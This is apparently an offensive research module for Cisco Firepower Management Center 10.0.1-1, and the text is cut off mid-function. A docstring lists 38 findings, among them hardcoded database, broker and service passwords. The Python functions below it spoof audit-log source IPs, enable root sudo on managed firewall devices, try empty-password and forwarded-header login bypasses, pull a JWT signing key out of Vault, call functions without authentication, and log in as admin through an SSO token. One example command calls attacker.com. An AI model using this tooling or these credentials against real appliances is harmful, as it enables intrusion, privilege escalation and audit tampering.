"""
cisco_fmc_re.py — Cisco Firepower Management Center (FMC) 10.0.1-1 static RE module

Target: FMC 10.0.1-1 (Virtual KVM)
  /media/cowboy/research/cisco-re/fmc-10.0.1/Cisco_Secure_FW_Mgmt_Center_Virtual_KVM-10.0.1-1.qcow2
  RE workspace: /media/cowboy/research/cisco-re/fmc-10.0.1/

Partitions:
  p5 (root, ext4): /media/cowboy/research/cisco-re/fmc-10.0.1/mnt/
  p7 (/Volume, ext4, LABEL="/Volume"): /media/cowboy/research/cisco-re/fmc-10.0.1/mnt-data/

Application root (p7): /media/cowboy/research/cisco-re/fmc-10.0.1/mnt-data/10.0.1-1/

OS: Wind River Linux LTS 22.33 Update 16 (NOT CentOS/RHEL as in pre-10.x FMC)
Primary auth binary: sf/bin/auth-daemon (24 MB Go, non-PIE EXEC)
Web framework: MICE (Mojolicious Perl), Athena (Java/Tomcat)
Port 443: FMC HTTPS (Perl Mojolicious via mod_sfcaptive_portal)
Port 1741: MICE legacy interface (localhost-only, Tomcat)
Port 2080: auth-daemon SAML validation endpoint (localhost)
Port 8200: HashiCorp Vault (localhost)

Key binary artifacts:
  binaries/auth-daemon    ELF64 EXEC (non-PIE), 24MB, Go, BuildID 186944ebf04465c212cea4420d0944775c81e9df
  binaries/sftunnel       ELF64 PIE, 767KB
  jars/athena-rbac-server.jar  3 classes: CsmCustomOgsFilter, NativeRbacServiceImpl, CsmCustomRbacCacheUpdater
  jars/bonfire.jar        Cisco internal pub/sub messaging framework
  jars/nbi-common.jar     NBI CWCS device model classes

Credential stores:
  /opt/CSCOpx/objects/security/conf/cwpass.xml  (MICE legacy interface accounts)

FINDINGS:

FMC-F1: auth-daemon Non-PIE EXEC — no ASLR on main binary [HIGH]
  Binary type: ELF64 EXEC (not PIE/DYN)
  Entry point: 0x47efa0 (fixed load address)
  Link: libresolv, pthread, libc only
  Impact: Fixed load addresses — ROP gadgets at predictable offsets;
          any memory corruption is immediately weaponizable without ASLR bypass.
  Note: 24 MB Go binary; 767 KB sftunnel IS PIE.

FMC-F2: cwpass.xml admin:admin and guest:(empty) hardcoded [CRITICAL]
  File: /opt/CSCOpx/objects/security/conf/cwpass.xml
  admin Pwd="0DPiKuNIrrVmD8IUCuw1hQxNqZc=" -> SHA-1("admin") confirmed
  guest Pwd="2jmj7l5rSw0yVb/vlWAYkK/YBwk=" -> SHA-1("") confirmed (empty password)
  guest RoleType="All" — full MICE interface access
  admin RoleType="None" — no built-in MICE roles (uses external Athena RBAC)
  Hash scheme: raw unsalted SHA-1 (no salt, no iteration)

FMC-F3: Guest Account Full Access / Empty Password [CRITICAL]
  The guest account in cwpass.xml has RoleType="All" (full access) with SHA-1("") = empty password.
  LocalhostServletFilter (web.xml) restricts MICE port 1741 to localhost and the FMC's own IPs.
  Bypass vector: X-Forwarded-For via nginx/reverse proxy in front of Tomcat
                 OR enableLocalhostFilter=false JVM property (startup config)
                 OR access from within any FMC-resident process (post-initial-access pivot)
  Impact: Full MICE legacy management interface access, authenticated as "guest" with all roles.

FMC-F4: Audit Log Falsification via remote_address Parameter [HIGH]
  File: sf/lib/perl/5.34.3/SF/Mojo/Handlers/Auth.pm
  Both login() and logout() handlers accept POST param remote_address:
    my $remote_address = $c->param("remote_address");
    if ($remote_address) { $ENV{'REMOTE_ADDR'} = $remote_address; }
  All SF::AuditLogMsg::AuditLogWrite calls use REMOTE_ADDR from environment.
  An attacker submitting remote_address=<victim_ip> attributes all audit entries
  to an arbitrary IP address — complete audit trail falsification.
  No authentication required to submit this parameter (checked before auth succeeds).

FMC-F5: BLANK_SEED = 72 Spaces — Weak Encryption Seed [HIGH]
  Class: com.cisco.nm.vms.rbac.NativeRbacServiceImpl (athena-rbac-server.jar)
  Code: static final String BLANK_SEED = "                                              " (72 spaces)
  Used as a cryptographic seed in the RBAC/password encryption path.
  Trivially predictable — any encrypted value using this seed can be decrypted offline.
  Additionally: KEEP_PASSWORD = "********" masks passwords in logs/UI.

FMC-F6: Unsalted SHA-1 Password Hashing (cwpass.xml) [HIGH]
  cwpass.xml stores passwords as raw SHA-1(password), no salt.
  Scheme verified: admin="0DPiKuNIrrVmD8IUCuw1hQxNqZc=" = base64(SHA-1("admin"))
  Vulnerable to precomputed rainbow table attacks — all common passwords trivially reversed.
  The active user database (MySQL at /Volume/lib/mysql/) uses SHA-512 (AUTH_SHA512 = 4)
  but the legacy cwpass.xml interface still uses SHA-1.

FMC-F7: RADKit sudoaccess Endpoint — Managed FTD Device Root [CRITICAL]
  Endpoint: PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess
  SOURCE PROOF: sf/lib/perl/5.34.3/SF/RADKit/RADKitAccess.pm
    RADKIT_SUDO_ACCESS_NO_PASSWORD = "ALL = NOPASSWD: ALL"
    Written to /etc/sudoers AND /ngfw/etc/sudoers on every managed FTD device.
    updateRADKitAccessState() called by ReconcileState plugin RADKIT_ACCESS_STATE.
  Auth-daemon strings: "Device Sudo Access", "isSudoEnabled", "PutSudoAccess",
    "AllUserRoutesPutSudoAccess", "Enable RADKit Service"
  RBAC permissions: "radkit" (view), "radkit.modify" (modify)
  Control file: /etc/sf/radkit.enabled
  Impact: FMC user with radkit.modify permission can enable sudo access on any managed
          FTD device — privilege escalation from FMC REST API access to FTD root shell.

FMC-F8: GroupId=2 Hardcoded Privileged Group SQL Query [MEDIUM]
  Class: com.cisco.nm.vms.ogs.client.CsmCustomOgsFilter (athena-rbac-server.jar)
  SQL: "select DisplayAttribute from AthenaOgsGroupCacheTable where GroupId = 2"
  Hardcoded GroupId=2 assumed to be the privileged OGS group at all times.
  If AthenaOgsGroupCacheTable is manipulated or GroupId ordering differs,
  wrong group gets privileged access in OGS filtering decisions.

FMC-F9: SSO Token MD5 — ASA/ASDM Trust Forgery [HIGH]
  Source: sf/lib/perl/5.34.3/SF/Auth.pm (create_sso_token function, line 4317)
  Code: my $token = Digest::MD5::md5_hex(encode_base64url($new_kek));
  The SSO token mediating ASA -> ASDM -> FMC trust uses MD5.
  Token is valid for 1 minute, single-use, but MD5 is cryptographically broken.
  If new_kek generation entropy is weak (PRNG seeding issue), token can be forged.
  Impact: Forgeable SSO token allows ASDM to authenticate to FMC as any user.

FMC-F10: HS256 JWT Symmetric Signing — Key Exposure = Token Forge [HIGH]
  auth-daemon binary strings: "TokenscopeHS256", "HS256", "Scope", "scope"
  FMC REST API access tokens signed with HMAC-SHA256 (symmetric key).
  Key storage: Vault (/etc/vault/ / https://127.0.0.1:8200)
  If MACHINE_USER_KEY or signing key leaks from Vault, all REST API tokens forgeable.
  JWT token endpoint: https://127.0.0.1/api/ui_platform/v1/uiauth/generatetoken (loopback)
  Session stores X-auth-access-token; validated by auth-daemon on port 2080.

FMC-F11: SHA-1 Forbidden in FIPS 140-3 but Present in Auth Flow [MEDIUM]
  auth-daemon binary: "FIPS 140-3 self-test failed / passed"
  auth-daemon: "crypto/sha1: use of SHA-1 is not allowed in FIPS 140-only mode"
  cwpass.xml uses SHA-1 for MICE credentials while FIPS 140-3 mode prohibits SHA-1.
  In FIPS mode, the SHA-1 cwpass.xml path may be blocked, but configuration-dependent.
  Admin password recovery path may use a code branch that bypasses FIPS enforcement.

FMC-F12: IKE PSK Plaintext Exposure via toString() Debug Chain [MEDIUM]
  hestia-vpn-shared.jar — PreSharedKeyPolicyBase.toString() appends "Key: " + sharedKey unmasked.
  VpnBaseTopologyObject.toString() chains through all child policies.
  Any debug log flush of VPN topology object writes all IKE PSKs in plaintext.
  IKE_PSK_KEY_LENGTH_MIN = 1 — validator allows 1-character PSKs.
  Impact: TAC support bundle or debug log -> all S2S VPN PSKs -> decrypt/hijack any managed IPsec tunnel.

FMC-F13: Undocumented RADKit authorizations Endpoint [MEDIUM]
  auth-daemon binary: "/api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/authorizations"
  Second RADKit endpoint, undocumented in public API. Same RBAC domain as sudoaccess.
  Alternate path for RADKit device authorization state enumeration and possible modification.

FMC-F14: cs-psucli.jar SecurityHandler Hardcoded passw0rd AES Key — CCO Credential Exposure [MEDIUM]
  com.cisco.nm.xms.vds.SecurityHandler: private static String passwordString = "passw0rd"
  Used for SymmetricCrypto.encrypt/decrypt on stored Cisco.com (CCO) credentials.
  Credential load path: ObjectInputStream.readObject() before decryption (deserialization risk if file writable).
  Impact: filesystem read -> decrypt CCO creds using "passw0rd"; file write -> Java deserialization RCE.

FMC-F15: PJB Handler On-Box Auth Bypass — Unauthenticated Arbitrary Function Dispatch [CRITICAL]
  SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm — isAuthorized():
  When isNGFWOnbox() == 1 (hardware FMC, /etc/sf/onbox.run exists, Aquila-class device):
    - PjbHandler: session auth SKIPPED entirely
    - isAuthorized: ALL permission checks bypassed; returns &{$function} for any registered function
  Attack: POST /pjb.cgi function=SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli
          parameters=["<deviceId>","copy tftp://attacker.com/x disk0:/x"]
  No credentials required. CLI whitelist: copy, delete, no, cluster, show, ping, traceroute, capture, clear, packet-tracer.
  Impact: Unauthenticated FTD file write/config deletion on all managed devices (hardware FMC only).

FMC-F16: ASDM Login Handler Hardcodes admin — SSO Token = Admin Session [HIGH]
  SF/Mojo/Handlers/AsdmLoginHandler.pm handle_login_cgi():
  SF::Auth::Login({ username => 'admin', password => $token, sso => 1, sensor_sso => 1, sso_token => $token })
  Token validated via MD5 (see F9: create_sso_token = MD5(base64url(new_kek))).
  Any valid SSO token logs in as admin — no admin password required.
  POST /asdmToken.cgi?sensor_sso=<token> -> admin FMC session.

-- Findings from Makeself upgrade package extraction (10.0.1-1) --

FMC-F17: SymmetricDS Hardcoded Database Credentials [CRITICAL]
  syb-000.properties: dba:dmkebdpq (Sybase port 10033)
  mdb-001.properties: root:IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/ (MySQL port 3306)
  Commented-out alternates present (prior rotation): hxjnynvf (Sybase), L2)_Ki*IDQbT2DMHw&tu[e<kba-kj}uGBb.myX_1 (MySQL)
  SymmetricDS replication engine syncs cfgdb (policy/config DB) between active/standby FMC.
  Direct DB access bypasses all FMC RBAC — read/write all policies, user accounts, device config.

FMC-F18: CSDAC Firmware-Embedded RSA-2048 Private Key [CRITICAL]
  File: sf/csdac/config/certs/key.pem (RSA-2048 PKCS#8 private key)
  Mounted into muster-envoy container as /etc/envoy/certificate.key (TLS termination key).
  Key is identical across all FMC 10.0.1-1 installations — firmware-embedded, not generated per-install.
  Any FMC 10.0.1-1 firmware extract yields the key; impersonation of any FMC's CSDAC/Muster endpoint.
  muster-envoy binds HTTPS at 127.0.0.1:6443; if accessible (post-foothold), key enables TLS MITM.

FMC-F19: ActiveMQ Hardcoded Credentials + JKS Password [HIGH]
  credentials.properties: activemq.username=system, activemq.password=manager, guest.password=password
  wrapper.conf: keyStorePassword=password, trustStorePassword=password (JKS broker TLS keys)
  ActiveMQ version: embedded in CSCOpx (opt/CSCOpx/objects/ess/); OpenWire port 61616, AMQP 5672 (commented)
  Full broker access with system:manager — read/publish all event queues, intercept policy distribution.

FMC-F20: MUSTER_DISABLE_AUTH=True + Docker Socket in CSDAC Backend [CRITICAL]
  docker-compose.yml muster-ui-backend: MUSTER_DISABLE_AUTH=True (explicit env var)
  muster-ui-backend also mounts: /var/run/docker.sock:/var/run/docker.sock
  Authentication is disabled at the application layer via environment variable.
  Docker socket is mounted read-write from the host into the container.
  CSDAC handles user identity data (AD/Azure AD enrichment) — exfiltrate all identity analytics.

FMC-F21: JaCORB CORBA Hardcoded keystore and default passwords [HIGH]
  opt/CSCOpx/lib/classpath/orb.properties:
    jacorb.security.keystore_password=jacorb
    jacorb.security.default_password=jacorb
  CSCOpx CORBA IOR-based RPC uses these to authenticate SSL client connections.
  Any client that knows "jacorb" can establish a CORBA SSL session to CSCOpx services.

FMC-F22: Vault Token at Predictable Static Path [HIGH]
  Constant: VAULT_TOKEN = '/etc/vault/token' (backup_restore_vault_secrets.pl)
  Token used to authenticate to Vault at https://127.0.0.1:8200 via: vault login $token
  Any process with local filesystem read access reads the token and authenticates to Vault.
  Vault secrets backed up to /etc/sf/vault/backup/ as JSON — backup directory is an offline exfiltration path.

FMC-F23: IOS Backend Hardcoded admin:cisco Template Credentials [HIGH]
  File: opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml
  Payload: username=admin&passwd=cisco (URL-encoded form params in XML template)
  IOS backend manages Cisco IOS device communication from FMC (CDO integration).
  Template credentials used for initial device onboarding; not rotated if template is reused.

FMC-F24: dbaccess.conf.in Default Database Credentials — World-Readable Credential Store [CRITICAL]
  File: /etc/sf/dbaccess.conf.in (template) -> /etc/sf/dbaccess.conf (runtime, chmod 644)
  Default credentials in shipped template:
    MySQL:   root:admin, interface:interface, barnyard:barnyard,
             correlator:correlator, external:external, cfguser:cfguser
    MonetDB: monetdb:monetdb123 (admin), eventdb_user:eventdb123
  Template comment: "NEW ENTRIES ADDED HERE WILL NOT BE RANDOMIZED."
  generate_db_access.sh randomizes on firstboot — but failure is non-fatal (warn-and-continue).
  Bypass: /etc/sf/dbaccess.random.disable disables all randomization.
  DBUtils._store_creds_db() sets chmod 644 on generated dbaccess.conf — world-readable.
  Impact: any local process reads /etc/sf/dbaccess.conf and obtains all DB credentials;
          MySQL root:admin -> full database compromise.

FMC-F25: Lamplighter JKS trustStorePassword="lamplighter" in Supervisord Commandline [HIGH]
  File: opt/lamplighter/etc/supervisord-manager-active.conf
  Java argument: -Djavax.net.ssl.trustStorePassword=lamplighter
  Hardcoded in the process commandline for FeedDownloader service.
  Any local process reading /proc/<pid>/cmdline or the supervisord conf retrieves the JKS password.
  Keystore: opt/lamplighter/etc/certs/external_ca.jks

FMC-F26: MongoDB Unauthenticated — Lamplighter Threat Intelligence Database [MEDIUM]
  File: opt/lamplighter/etc/mongod.conf
  No security.authorization entry — MongoDB runs without auth.
  bindIp: 127.0.0.1 (localhost-only).
  Database: lamplighter (threat intelligence feeds, STIX/TAXII data).
  Any local process connects to 127.0.0.1:27017 and reads/writes all TID data.

FMC-F27: Redis Unauthenticated — Lamplighter Threat Intelligence Cache [MEDIUM]
FMC-F28: RabbitMQ definitions.json — Six Hardcoded Default Passwords Including Administrator [CRITICAL]
FMC-F29: MICE Legacy Port 1741 — Plain HTTP, SSLEngine Off, All Interfaces [CRITICAL]
FMC-F30: Tomcat AJP Connector secretRequired=false — Ghostcat Mitigation Disabled [HIGH]
FMC-F31: Threat Grid API Key Derived from Network-Observable MAC Address [HIGH]
FMC-F32: Five Hardcoded Machine Service Accounts with Fixed Passwords [HIGH]
FMC-F33: Admin123 Hardcoded as Provisioning Default Across Multiple Subsystems [HIGH]
FMC-F34: RADIUS Shared Secret Encrypted with Non-Secret APPLIANCE_UUID [HIGH]
FMC-F35: IPMI BMC Provisioned with Hardcoded admin:Admin123 [HIGH]
FMC-F36: SMTP Credentials Encrypted with Hardcoded Blowfish Key 'sourcefire' [MEDIUM]
FMC-F37: RabbitMQ Restricted to Deprecated TLSv1.1 [MEDIUM]
FMC-F38: pam_faillock deny=0 — OS-Level Account Lockout Disabled [MEDIUM]
  File: opt/lamplighter/etc/redis.conf
  requirepass not set; protected-mode commented out.
  bind 127.0.0.1 (localhost-only).
  Redis caches threat intelligence feed data.
  Any local process connects to 127.0.0.1:6379 and reads/writes all cached TID data.
"""

import base64
import hashlib
import struct
import requests
import json
import re
from typing import Optional

VERSION = "1.5.0"
TARGET = "Cisco FMC 10.0.1-1"


# ── F2/F3: cwpass.xml credential verification ─────────────────────────────────

CWPASS_CREDS = [
    {"username": "admin",  "password": "admin",  "roletype": "None", "hash": "0DPiKuNIrrVmD8IUCuw1hQxNqZc="},
    {"username": "guest",  "password": "",        "roletype": "All",  "hash": "2jmj7l5rSw0yVb/vlWAYkK/YBwk="},
]

def verify_cwpass_hashes() -> list[dict]:
    """Verify cwpass.xml SHA-1 hashes match known plaintexts."""
    results = []
    for cred in CWPASS_CREDS:
        computed = base64.b64encode(hashlib.sha1(cred["password"].encode()).digest()).decode()
        match = computed == cred["hash"]
        results.append({
            "username": cred["username"],
            "password_repr": repr(cred["password"]),
            "roletype": cred["roletype"],
            "hash": cred["hash"],
            "hash_match": match,
            "scheme": "SHA-1 (no salt)",
        })
    return results


def crack_cwpass_hash(b64_hash: str, wordlist: Optional[list[str]] = None) -> Optional[str]:
    """Attempt to crack a cwpass.xml SHA-1 hash against a wordlist."""
    if wordlist is None:
        wordlist = ["", "admin", "cisco", "password", "Admin", "Cisco123",
                    "cisco123", "admin123", "Admin1234", "firepower", "Firepower",
                    "sourcefire", "Sourcefire"]
    target = base64.b64decode(b64_hash)
    for candidate in wordlist:
        if hashlib.sha1(candidate.encode()).digest() == target:
            return candidate
    return None


# ── F4: Audit Log Falsification ───────────────────────────────────────────────

def falsify_audit_login(host: str, username: str, password: str,
                        spoof_ip: str = "127.0.0.1", port: int = 443,
                        session: Optional[requests.Session] = None) -> dict:
    """
    Login to FMC REST API with a spoofed remote_address in the audit log.
    remote_address parameter overrides REMOTE_ADDR in SF::Auth audit writes.
    POST /api/fmc_config/v1/auth/generatetoken or /auth/login with remote_address=<spoof_ip>
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/api/fmc_config/v1/auth/generatetoken"
    headers = {"Content-Type": "application/json"}
    params = {"remote_address": spoof_ip}

    try:
        resp = session.post(url, auth=(username, password),
                            headers=headers, params=params, timeout=10)
        return {
            "url": url,
            "spoof_ip": spoof_ip,
            "status": resp.status_code,
            "x_auth_token": resp.headers.get("X-auth-access-token", ""),
            "finding": "FMC-F4",
            "note": "If 200, audit log records login from spoof_ip instead of actual source",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F4"}


def falsify_audit_login_form(host: str, username: str, password: str,
                              spoof_ip: str = "127.0.0.1", port: int = 443,
                              session: Optional[requests.Session] = None) -> dict:
    """
    Login to FMC Mojo web UI with spoofed remote_address.
    POST /auth/login?username=X&password=Y&remote_address=Z
    Source: SF/Mojo/Handlers/Auth.pm login() — params extracted via $c->param()
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/auth/login"
    data = {
        "username": username,
        "password": password,
        "remote_address": spoof_ip,
    }

    try:
        resp = session.post(url, data=data, timeout=10)
        return {
            "url": url,
            "spoof_ip": spoof_ip,
            "status": resp.status_code,
            "finding": "FMC-F4",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F4"}


# ── F7: RADKit sudoaccess Probe ────────────────────────────────────────────────

def probe_radkit_sudoaccess(host: str, token: str, domain_uuid: str,
                             port: int = 443, session: Optional[requests.Session] = None) -> dict:
    """
    Check RADKit sudoaccess status and attempt to enable sudo on FTD devices.
    Endpoint: PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess
    Requires radkit.modify RBAC permission.
    isSudoEnabled=true grants sudo on all RADKit-managed FTD devices.
    """
    if session is None:
        session = requests.Session()
    session.verify = False
    headers = {
        "X-auth-access-token": token,
        "Content-Type": "application/json",
    }

    base = f"https://{host}:{port}/api/fmc_troubleshoot/v1/domain/{domain_uuid}/radkit"

    results = {}

    # Check radkit status
    try:
        r = session.get(f"{base}", headers=headers, timeout=10)
        results["status_get"] = {"status": r.status_code, "body": r.text[:500]}
    except Exception as e:
        results["status_get"] = {"error": str(e)}

    # Check sudo access state
    try:
        r = session.get(f"{base}/sudoaccess", headers=headers, timeout=10)
        results["sudoaccess_get"] = {"status": r.status_code, "body": r.text[:500]}
    except Exception as e:
        results["sudoaccess_get"] = {"error": str(e)}

    # Attempt to enable sudo
    try:
        payload = {"isSudoEnabled": True}
        r = session.put(f"{base}/sudoaccess", headers=headers,
                        json=payload, timeout=10)
        results["sudoaccess_enable"] = {
            "status": r.status_code,
            "body": r.text[:500],
            "note": "200 = sudo enabled on all RADKit-managed FTD devices",
        }
    except Exception as e:
        results["sudoaccess_enable"] = {"error": str(e)}

    results["finding"] = "FMC-F7"
    results["impact"] = "radkit.modify permission enables root-level sudo on managed FTD devices"
    return results


# ── F2/F3: MICE Guest Login (port 1741 or via bypass) ─────────────────────────

def probe_mice_guest_login(host: str, port: int = 1741,
                            session: Optional[requests.Session] = None) -> dict:
    """
    Attempt MICE legacy interface login as guest with empty password.
    Default credentials: guest:(empty), RoleType="All" from cwpass.xml.
    Normally restricted to localhost by LocalhostServletFilter — test via forwarded request
    or if X-Forwarded-For bypass is available.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"http://{host}:{port}/CSCOnm/servlet/login"
    data = {
        "username": "guest",
        "password": "",
        "next": "/CSCOnm/index.jsp",
    }

    try:
        resp = session.post(url, data=data, timeout=10,
                            allow_redirects=False)
        return {
            "url": url,
            "status": resp.status_code,
            "location": resp.headers.get("Location", ""),
            "finding": "FMC-F3",
            "note": "Redirect to /CSCOnm/index.jsp = successful login as guest/All-Roles",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F3"}


def probe_mice_guest_xfwd(host: str, port: int = 443,
                           session: Optional[requests.Session] = None) -> dict:
    """
    Attempt MICE access via X-Forwarded-For: 127.0.0.1 to bypass LocalhostServletFilter.
    The filter checks req.getRemoteAddr() — if nginx passes XFF as remote addr, bypass succeeds.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/classic/j_security_check"
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
    }
    data = {
        "j_username": "guest",
        "j_password": "",
    }

    try:
        resp = session.post(url, data=data, headers=headers, timeout=10,
                            allow_redirects=False)
        return {
            "url": url,
            "status": resp.status_code,
            "location": resp.headers.get("Location", ""),
            "finding": "FMC-F3",
            "note": "XFW bypass attempt — 302 away from error page = success",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F3"}


# ── F9/F10: Token probes ───────────────────────────────────────────────────────

def decode_fmc_token(token: str) -> dict:
    """Decode FMC JWT without verification — expose header, payload, signing alg."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "not a JWT"}

        def pad(s):
            return s + "=" * (4 - len(s) % 4)

        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        return {
            "header": header,
            "payload": payload,
            "alg": header.get("alg", "unknown"),
            "finding": "FMC-F10",
            "note": "HS256 = symmetric HMAC key; key leak -> token forge",
        }
    except Exception as e:
        return {"error": str(e)}


def get_fmc_token(host: str, username: str, password: str,
                  port: int = 443, session: Optional[requests.Session] = None) -> dict:
    """
    Obtain FMC REST API access token.
    POST /api/fmc_config/v1/auth/generatetoken
    Returns X-auth-access-token, X-auth-refresh-token, DOMAIN_UUID.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/api/fmc_config/v1/auth/generatetoken"
    try:
        resp = session.post(url, auth=(username, password), timeout=15)
        return {
            "status": resp.status_code,
            "token": resp.headers.get("X-auth-access-token", ""),
            "refresh_token": resp.headers.get("X-auth-refresh-token", ""),
            "domain_uuid": resp.headers.get("DOMAIN_UUID", ""),
        }
    except Exception as e:
        return {"error": str(e)}


# ── SAML/SSO port 2080 probe ──────────────────────────────────────────────────

def probe_saml_port_2080(host: str = "127.0.0.1") -> dict:
    """
    Probe auth-daemon's internal SAML validation endpoint on port 2080.
    SF::Auth.pm: "http://localhost:2080/saml/validate?sso_token=$token"
    Should only be accessible from localhost. If exposed externally, SAML token
    validation can be directly queried to check/forge session tokens.
    """
    try:
        r = requests.get(f"http://{host}:2080/saml/validate", timeout=5)
        return {"status": r.status_code, "body": r.text[:300], "finding": "FMC-F9"}
    except Exception as e:
        return {"error": str(e), "note": "Expected — port 2080 should be localhost only"}


# ── F10/F22: Vault cert-auth key extraction ───────────────────────────────────

def probe_vault_cert_auth(vault_key_path: str = "/etc/vault/admin") -> dict:
    """
    F10/F22: Probe Vault cert-based auth path (localhost only).
    Lists /etc/vault/admin/ for cert key file, attempts cert auth,
    retrieves MACHINE_USER_KEY (HS256 JWT signing key).
    Source: SF/Vault.pm cert auth path; auth-daemon MACHINE_USER_KEY string.
    Requires local filesystem read access.
    """
    import glob, os
    result = {"finding": "FMC-F10-F22", "vault_host": "https://127.0.0.1:8200"}
    key_files = glob.glob(f"{vault_key_path}/*/vault.key")
    result["vault_key_candidates"] = key_files
    if not key_files:
        result["status"] = "no_key_found"
        return result
    result["vault_key"] = key_files[0]
    try:
        r = requests.post(
            "https://127.0.0.1:8200/v1/auth/cert/login",
            cert=(key_files[0], key_files[0]),
            verify=False,
            timeout=5,
        )
        result["cert_auth_status"] = r.status_code
        result["cert_auth_body"] = r.text[:500]
        if r.status_code == 200:
            token = r.json().get("auth", {}).get("client_token")
            result["vault_token"] = token
            if token:
                kv = requests.get(
                    "https://127.0.0.1:8200/v1/secret/data/machine_user_key",
                    headers={"X-Vault-Token": token},
                    verify=False,
                    timeout=5,
                )
                result["machine_user_key_status"] = kv.status_code
                result["machine_user_key_body"] = kv.text[:500]
    except Exception as e:
        result["error"] = str(e)
    return result


# ── F15: PJB on-box auth bypass probe ─────────────────────────────────────────

def probe_pjb_onbox_bypass(host: str, function: str = "SF::UI::PJB::ping",
                           parameters: str = "[]", port: int = 443) -> dict:
    """
    F15: Probe PJB handler without session cookie.
    If isNGFWOnbox() is true on the target, auth is bypassed and function executes.
    Use 'SF::UI::PJB::ping' (requires 'all' permission) as baseline.
    For impact demo: 'SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli'
    with parameters='["<deviceId>","show version"]' — no creds needed.
    """
    url = f"https://{host}:{port}/pjb.cgi"
    try:
        r = requests.post(
            url,
            data={"function": function, "parameters": parameters},
            verify=False,
            timeout=10,
        )
        return {
            "status": r.status_code,
            "body": r.text[:500],
            "finding": "FMC-F15",
            "note": "200 without auth cookie = isNGFWOnbox bypass confirmed",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F15"}


def probe_asdm_sso_login(host: str, token: str, port: int = 443) -> dict:
    """
    F16: Probe ASDM SSO login endpoint with a forged or captured SSO token.
    If token is valid (or forgeable via F9 MD5), responds with session cookie as admin.
    """
    url = f"https://{host}:{port}/asdm/logon.html"
    try:
        r = requests.get(
            url,
            params={"sensor_sso": token},
            verify=False,
            allow_redirects=False,
            timeout=10,
        )
        session_cookie = r.cookies.get("CGISESSID", "")
        return {
            "status": r.status_code,
            "session_cookie": session_cookie,
            "location": r.headers.get("Location", ""),
            "finding": "FMC-F16",
            "note": "200 + CGISESSID = admin session; 302 away = token invalid",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F16"}


# ── Static analysis helpers ───────────────────────────────────────────────────

def report_binary_pie_status(binary_path: str) -> dict:
    """Report ELF PIE status of auth-daemon (F1)."""
    import subprocess
    try:
        out = subprocess.check_output(
            ["readelf", "-h", binary_path], stderr=subprocess.DEVNULL, text=True)
        etype = "unknown"
        for line in out.splitlines():
            if "Type:" in line:
                etype = line.split(":", 1)[1].strip()
                break
        return {
            "binary": binary_path,
            "elf_type": etype,
            "is_pie": "DYN" in etype,
            "finding": "FMC-F1",
            "note": "EXEC = non-PIE, fixed load address, no ASLR",
        }
    except Exception as e:
        return {"error": str(e)}


# ── F17: SymmetricDS credential verification ──────────────────────────────────

SYMMETRICDS_CREDS = {
    "sybase": {
        "driver": "com.sybase.jdbc4.jdbc.SybDriver",
        "host": "localhost",
        "port": 10033,
        "db": "vms",
        "user": "dba",
        "password": "dmkebdpq",
        "prior_password": "hxjnynvf",
        "file": "syb-000.properties",
    },
    "mysql": {
        "driver": "com.mysql.jdbc.Driver",
        "host": "localhost",
        "port": 3306,
        "db": "cfgdb",
        "user": "root",
        "password": "IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/",
        "prior_password": "L2)_Ki*IDQbT2DMHw&tu[e<kba-kj}uGBb.myX_1",
        "file": "mdb-001.properties",
    },
}

def get_symmetricds_creds() -> dict:
    """Return SymmetricDS hardcoded credentials for Sybase and MySQL (F17)."""
    return SYMMETRICDS_CREDS


# ── F18: CSDAC static key fingerprint ─────────────────────────────────────────

CSDAC_KEY_PATH = "sf/csdac/config/certs/key.pem"
CSDAC_ENVOY_PORT = 6443  # 127.0.0.1:6443 (muster-envoy HTTPS)
CSDAC_BEE_PORT = 15050   # 127.0.0.1:15050 (muster-bee gRPC)

def report_csdac_key_info() -> dict:
    """Report CSDAC static firmware-embedded key metadata (F18)."""
    return {
        "finding": "FMC-F18",
        "path": CSDAC_KEY_PATH,
        "type": "RSA-2048 PKCS#8 private key",
        "scope": "All FMC 10.0.1-1 installs (firmware-embedded, not per-instance generated)",
        "usage": "muster-envoy TLS termination at 127.0.0.1:6443",
        "impact": "TLS impersonation of any FMC CSDAC/Muster endpoint once key is extracted from firmware",
    }


# ── F19: ActiveMQ credential constants ────────────────────────────────────────

ACTIVEMQ_CREDS = {
    "system": "manager",
    "guest": "password",
}
ACTIVEMQ_JKS_PASSWORD = "password"
ACTIVEMQ_OPENIRE_PORT = 61616

def get_activemq_creds() -> dict:
    """Return ActiveMQ hardcoded credentials (F19)."""
    return {
        "finding": "FMC-F19",
        "creds": ACTIVEMQ_CREDS,
        "jks_password": ACTIVEMQ_JKS_PASSWORD,
        "port": ACTIVEMQ_OPENIRE_PORT,
        "files": [
            "opt/CSCOpx/objects/ess/conf/credentials.properties",
            "opt/CSCOpx/objects/ess/bin/linux-x86-64/wrapper.conf",
        ],
    }


# ── F20: MUSTER_DISABLE_AUTH probe ────────────────────────────────────────────

def probe_muster_unauth(host: str, port: int = 6443,
                        session: Optional[requests.Session] = None) -> dict:
    """
